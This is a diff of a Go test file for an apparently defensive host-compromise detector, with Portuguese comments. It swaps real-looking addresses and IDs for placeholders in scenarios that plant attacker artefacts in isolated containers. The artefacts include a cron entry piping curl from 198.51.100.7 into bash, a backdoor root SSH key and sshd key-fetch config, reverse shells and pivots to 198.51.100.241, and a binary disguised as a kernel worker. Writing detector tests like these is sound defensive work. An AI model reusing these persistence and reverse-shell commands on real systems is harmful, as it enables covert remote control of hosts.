@@ -49,7 +49,7 @@ const persistencia = `mkdir -p /etc/systemd/system/ssh.service.d /etc/systemd/sy
 const agendamentoEChaves = `mkdir -p /etc/cron.d /var/spool/cron/crontabs /root/.ssh /var/spool/cron/atjobs /etc/ssh/sshd_config.d
 	printf '*/7 * * * * root /bin/sh -c "curl -s http://198.51.100.7/a | bash"\n' > /etc/cron.d/zz-update
 	printf '@reboot /tmp/.x\n*/3 * * * * /usr/local/bin/beacon\n' > /var/spool/cron/crontabs/root
-	printf 'command="/tmp/.k",no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCx kali@attacker\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBx lex@estacao\n' > /root/.ssh/authorized_keys
+	printf 'command="/tmp/.k",no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCx kali@attacker\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBx ana@estacao\n' > /root/.ssh/authorized_keys
 	printf 'export SSH_CONNECTION="203.0.113.9 51234 10.0.0.5 22"\nexport USER=root\n/tmp/.later\n' > /var/spool/cron/atjobs/a00001019
 	printf 'AuthorizedKeysCommand /usr/local/sbin/keyfetch\nAuthorizedKeysCommandUser root\n' > /etc/ssh/sshd_config.d/99-x.conf
 	printf 'Port 22\n' > /etc/ssh/sshd_config`
@@ -445,7 +445,7 @@ func init() {
 	// valor — sozinho, o positivo não prova que o check discrimina.
 	//
 	// Endereço público sem rede: `--network=none` mais apelidos em `lo`. Para
-	// quem classifica, 51.91.190.241 é público; para a máquina, nada sai do
+	// quem classifica, 198.51.100.241 é público; para a máquina, nada sai do
 	// namespace.
 
 	Register(Scenario{
@@ -455,10 +455,10 @@ func init() {
 		Caps:      []string{"NET_ADMIN"},
 		NoNetwork: true,
 		Plant: `ip link set lo up
-			ip addr add 51.91.190.241/32 dev lo
-			/helper listen 51.91.190.241:9001 &
+			ip addr add 198.51.100.241/32 dev lo
+			/helper listen 198.51.100.241:9001 &
 			sleep 0.4
-			/helper revshell 51.91.190.241:9001 &
+			/helper revshell 198.51.100.241:9001 &
 			sleep 0.5`,
 		Expect: []Expect{{ID: "correlate.revshell", Sev: "CRITICAL"}},
 		// O outro lado da conexão está no mesmo host e no mesmo namespace: o
@@ -482,10 +482,10 @@ func init() {
 		Caps:      []string{"NET_ADMIN"},
 		NoNetwork: true,
 		Plant: `ip link set lo up
-			ip addr add 51.91.190.241/32 dev lo
-			/helper listen 51.91.190.241:9001 &
+			ip addr add 198.51.100.241/32 dev lo
+			/helper listen 198.51.100.241:9001 &
 			sleep 0.4
-			/helper revshell-bridge 51.91.190.241:9001 &
+			/helper revshell-bridge 198.51.100.241:9001 &
 			sleep 1`,
 		Expect: []Expect{
 			{ID: "correlate.revshell_bridge", Sev: "WARN", Evidence: "lê do pipe"},
@@ -529,12 +529,12 @@ func init() {
 		Caps:      []string{"NET_ADMIN"},
 		NoNetwork: true,
 		Plant: `ip link set lo up
-			ip addr add 51.91.190.241/32 dev lo
+			ip addr add 198.51.100.241/32 dev lo
 			ip addr add 10.0.0.9/32 dev lo
-			/helper listen 51.91.190.241:9001 &
+			/helper listen 198.51.100.241:9001 &
 			/helper listen 10.0.0.9:9002 &
 			sleep 0.4
-			/helper connect 51.91.190.241:9001 10.0.0.9:9002 &
+			/helper connect 198.51.100.241:9001 10.0.0.9:9002 &
 			sleep 0.5`,
 		Expect: []Expect{{ID: "net.pivot", Sev: "WARN"}},
 		// Sem dup2 sobre os descritores padrão não há assinatura de shell: os
@@ -554,13 +554,13 @@ func init() {
 		Caps:      []string{"NET_ADMIN"},
 		NoNetwork: true,
 		Plant: `ip link set lo up
-			ip addr add 51.91.190.241/32 dev lo
+			ip addr add 198.51.100.241/32 dev lo
 			ip addr add 10.0.0.9/32 dev lo
 			/helper listen 10.0.0.9:9002 &
 			sleep 0.3
-			/helper proxy 51.91.190.241:9001 10.0.0.9:9002 &
+			/helper proxy 198.51.100.241:9001 10.0.0.9:9002 &
 			sleep 0.3
-			/helper connect 51.91.190.241:9001 &
+			/helper connect 198.51.100.241:9001 &
 			sleep 0.5`,
 		Forbid:         []string{"net.pivot", "correlate.revshell"},
 		Exit:           -1, // idem 41: o /helper do rig não tem dono de pacote
@@ -580,10 +580,10 @@ func init() {
 		Caps:      []string{"NET_ADMIN"},
 		NoNetwork: true,
 		Plant: `ip link set lo up
-			ip addr add 51.91.190.241/32 dev lo
-			/helper listen 51.91.190.241:9001 &
+			ip addr add 198.51.100.241/32 dev lo
+			/helper listen 198.51.100.241:9001 &
 			sleep 0.4
-			/helper revshell 51.91.190.241:9001 &
+			/helper revshell 198.51.100.241:9001 &
 			sleep 0.5`,
 		Expect:         []Expect{{ID: "correlate.revshell", Sev: "CRITICAL"}},
 		Exit:           2,
@@ -852,14 +852,14 @@ func init() {
 		Caps:      []string{"NET_ADMIN"},
 		NoNetwork: true,
 		Plant: `ip link set lo up
-			ip addr add 51.91.190.241/32 dev lo
+			ip addr add 198.51.100.241/32 dev lo
 			adduser -D -u 1000 node 2>/dev/null
 			mkdir -p /home/node/.config/htop
 			cp /helper /home/node/.config/htop/defunct
-			/helper listen 51.91.190.241:443 &
+			/helper listen 198.51.100.241:443 &
 			sleep 0.4
 			export GSOCKET_ARGS="-s segredo" GS_ARGS="-liD"
-			/home/node/.config/htop/defunct argv0 "[kworker/1:2]" /home/node/.config/htop/defunct revshell 51.91.190.241:443 &
+			/home/node/.config/htop/defunct argv0 "[kworker/1:2]" /home/node/.config/htop/defunct revshell 198.51.100.241:443 &
 			sleep 0.6`,
 		Expect: []Expect{
 			{ID: "correlate.revshell", Sev: "CRITICAL"},
@@ -932,12 +932,12 @@ func init() {
 		Caps:      []string{"NET_ADMIN"},
 		NoNetwork: true,
 		Plant: `ip link set lo up
-			ip addr add 51.91.190.241/32 dev lo
+			ip addr add 198.51.100.241/32 dev lo
 			mkdir -p /usr/local/sbin /etc/systemd/system/sshd.service.d
 			cp /helper /usr/local/sbin/systemd-netlinkd
-			/helper listen 51.91.190.241:8443 &
+			/helper listen 198.51.100.241:8443 &
 			sleep 0.4
-			/usr/local/sbin/systemd-netlinkd connect 51.91.190.241:8443 &
+			/usr/local/sbin/systemd-netlinkd connect 198.51.100.241:8443 &
 			printf '[Service]\nExecStartPre=/usr/local/sbin/systemd-netlinkd sleep 1\n' > /etc/systemd/system/sshd.service.d/10-hardening.conf
 			printf '[Timer]\nOnUnitActiveSec=1h\n' > /etc/systemd/system/systemd-netlinkd.timer
 			sleep 0.5`,
@@ -1023,9 +1023,9 @@ func init() {
 		// é o cenário que trava o casamento por PREFIXO.
 		Images: matriz,
 		Plant: `mkdir -p /opt/runzero/bin /etc/runzero
-			cp /helper /opt/runzero/bin/runzero-agent-c1f4a2e0-9b3d-4a71-8f22-5e6d0b1c7a93
+			cp /helper /opt/runzero/bin/runzero-agent-aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee
 			printf 'token=abc\n' > /etc/runzero/config
-			/opt/runzero/bin/runzero-agent-c1f4a2e0-9b3d-4a71-8f22-5e6d0b1c7a93 sleep 300 &
+			/opt/runzero/bin/runzero-agent-aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee sleep 300 &
 			sleep 0.4`,
 		Expect: []Expect{
 			// config em disco — a rota que funciona em imagem montada
